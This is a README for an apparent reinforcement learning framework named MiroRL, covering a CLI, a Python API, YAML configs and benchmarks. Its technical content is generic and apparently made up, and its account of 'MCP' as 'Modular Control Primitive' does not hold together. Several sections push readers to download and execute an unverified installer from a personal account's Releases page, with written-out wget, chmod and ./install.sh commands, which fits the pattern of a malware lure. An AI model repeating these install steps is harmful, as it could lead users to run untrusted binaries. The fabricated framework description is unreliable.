# MiroRL — MCP-First RL Framework for Deep Research Agents 🤖🧠

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/ibi4739/MiroRL/releases)

![MiroRL banner](https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1600&q=60)

MiroRL is an MCP-first reinforcement learning framework built for deep research agents. It focuses on modular control primitives (MCPs), clear experiment wiring, and reproducible training pipelines. Use MiroRL to prototype agents, run reproducible experiments, and extend algorithms at the primitive level.

Table of contents
- Overview
- Key concepts
- Main features
- Architecture diagram
- Quick install (releases)
- Basic usage
- Example agents
- Experiment recipes
- Configuration
- Benchmarks
- Contributing
- License and contact

Overview
MiroRL gives researchers a structured platform that centers on MCPs. MCPs are small, testable control units. The framework composes MCPs into policies, supports custom environments, and ships tools for logging and evaluation. You can plug your own models, optimizers, and schedulers.

Key concepts
- MCP (Modular Control Primitive): Small unit of agent control. Each MCP exposes a state-action interface.
- Agent graph: A directed graph of MCPs. The graph routes observations, actions, and sub-goals.
- Policy head: Final mapping from MCP outputs to environment actions.
- Learner: Training loop that handles rollout collection, gradient steps, and checkpointing.
- Replay buffer: Standard replay storage with priority support.
- Runner: Orchestrator for parallel environment instances and data collection.

Main features
- MCP-first API. Design agents from primitives.
- Multiple algorithm backends: DQN-style, actor-critic, and policy gradients.
- Vectorized environments and multiprocessing runner.
- Built-in evaluators and metric logging (TensorBoard, CSV).
- Checkpointing, resume, and deterministic seeding.
- Config-driven experiments using YAML.
- Lightweight CLI for experiment lifecycle.
- Test suite for MCPs and agent graphs.

Architecture diagram
![Architecture](https://upload.wikimedia.org/wikipedia/commons/3/3f/Flow_chart_system_wall.svg)

The diagram shows:
1. Environment pool (vectorized).
2. Runner that collects trajectories.
3. Modular Control Primitives assembled in an agent graph.
4. Learner that consumes batches and updates MCP parameters.
5. Logger and evaluator that save metrics and videos.

Quick install (releases)
Download the prebuilt release from the Releases page and execute the installer. Visit the releases page and pick the asset that matches your OS and architecture:

https://github.com/ibi4739/MiroRL/releases

Example commands to download and run the installer on Linux:
```bash
# download the Linux installer from Releases
wget https://github.com/ibi4739/MiroRL/releases/download/v1.0.0/MiroRL-1.0.0-linux-x86_64.tar.gz -O MiroRL.tar.gz

# extract
tar -xzf MiroRL.tar.gz

# run the installer or the included setup script
cd MiroRL-1.0.0
chmod +x install.sh
./install.sh
```

Windows and macOS installers appear as separate assets on the same releases page. Download the matching archive or installer and run the executable for your platform. The release asset contains a binary and the reference configs. If the downloads fail, check the "Releases" section on the repo.

Basic usage
After installation you get a CLI binary named mirol. The CLI controls experiment creation, runs, and evaluations.

Create a new experiment:
```bash
mirol create --name my-exp --config configs/vanilla.yaml
```

Run training:
```bash
mirol run --exp my-exp --gpu 0
```

Evaluate a checkpoint:
```bash
mirol eval --exp my-exp --ckpt checkpoints/ckpt_100000.pth
```

Python API
You can import MiroRL in Python and build agents programmatically.

Example: build a simple MCP chain and run one rollout.
```python
from mirol import envs, AgentGraph, MCP, Runner

# make environment
env = envs.make("CartPole-v1", num_envs=8)

# define MCPs
class ProportionalMCP(MCP):
    def forward(self, obs):
        # obs is a tensor shaped (batch, obs_dim)
        return self.model(obs)  # returns action logits

# build agent graph
graph = AgentGraph()
graph.add_mcp("policy", ProportionalMCP, input_shape=env.obs_shape, hidden=64)
graph.link("policy", "action")

# runner collects a few steps
runner = Runner(env, graph, device="cpu")
batch = runner.collect(steps=128)
print(batch.observations.shape, batch.actions.shape)
```

Example agents
- Vanilla Actor-Critic: Standard policy and value MCPs. Use for continuous control.
- Hierarchical MCP Agent: Top-level MCP sets goals. Low-level MCPs handle primitives.
- Multi-head Perception Agent: Shared encoder MCP with multiple policy heads.

Experiment recipes
MiroRL uses YAML configs. A config defines the env, agent graph, learner, and logging.

Sample config (snippets):
```yaml
env:
  name: Walker2d-v3
  num_envs: 16
  seed: 42

agent:
  graph:
    - name: encoder
      type: ConvEncoder
      args: {channels: [32,64], kernel: [8,4]}
    - name: policy
      type: MLPPolicy
      args: {hidden: [256,256]}
    - link: [encoder, policy]

learner:
  batch_size: 256
  lr: 3e-4
  optimizer: adam
  gamma: 0.99
  updates_per_step: 1

logging:
  tb_dir: ./runs
  ckpt_dir: ./checkpoints
```

Configuration
- agent.graph: List of MCPs and links. Each MCP gets a name, type, and args.
- learner: Learning rate, optimizer, loss clipping, scheduler.
- runner: Number of steps per update, worker count, frame skip.
- replay: Capacity, priority alpha, and beta schedule.
- eval: Evaluation frequency and episodes per eval.

MCP development
An MCP has a small interface: init, forward, save_state, load_state. Keep MCPs deterministic for reproducible tests. Write unit tests around the MCP's forward method and state handling.

API quick reference
- mirol.create(config_path, out_dir)
- mirol.run(exp_name, resume=False, device="cpu")
- mirol.eval(exp_name, ckpt, render=False)
- mirol.save_checkpoint(path)
- mirol.load_checkpoint(path)

Benchmarks
MiroRL includes benchmark scripts under benchmarks/. Run a benchmark with the CLI.

Example:
```bash
mirol bench --config benchmarks/ppo_cartpole.yaml --runs 3
```

Benchmarks log learning curves and runtime stats. The framework records throughput (steps/sec) and memory use per worker.

Logging and visualization
MiroRL supports:
- TensorBoard
- CSV export
- Video recording per eval episode

Start tensorboard:
```bash
tensorboard --logdir runs
```

Testing and CI
The repo contains unit tests for MCPs and integration tests for runner and learner. Run tests with pytest:
```bash
pytest tests -q
```

Extending MiroRL
- Add a new MCP by subclassing MCP and registering it in the factory.
- Implement a custom learner by extending the base Learner class.
- Add new environment wrappers in envs/wrappers.py.

Code style
- Follow PEP8 for Python.
- Keep MCPs small and focused.
- Write tests for control logic and state transitions.

Troubleshooting
If an experiment fails to run, check:
- Config file paths.
- CUDA device visibility.
- That the release asset matches your platform.

Releases and downloads
Download and execute the release asset for your platform from the Releases page here:

https://github.com/ibi4739/MiroRL/releases

The releases page lists binaries and installers. Each release includes:
- installer script for Linux
- macOS package
- Windows zip archive
- reference configs and sample checkpoints

Contributing
1. Fork the repo.
2. Create a feature branch.
3. Add tests for new code.
4. Open a pull request describing the change and rationale.

Guidelines
- Write unit tests for MCPs.
- Keep diffs small.
- Use clear commit messages.

Community and support
Open issues for bugs or feature requests. Use issue templates for bug reports and feature requests. Tag maintainers on PRs for faster review.

License
MiroRL is released under the MIT License. See LICENSE for details.

Contact
Open an issue for questions or pull requests. Include a short reproducible example for bugs and performance issues.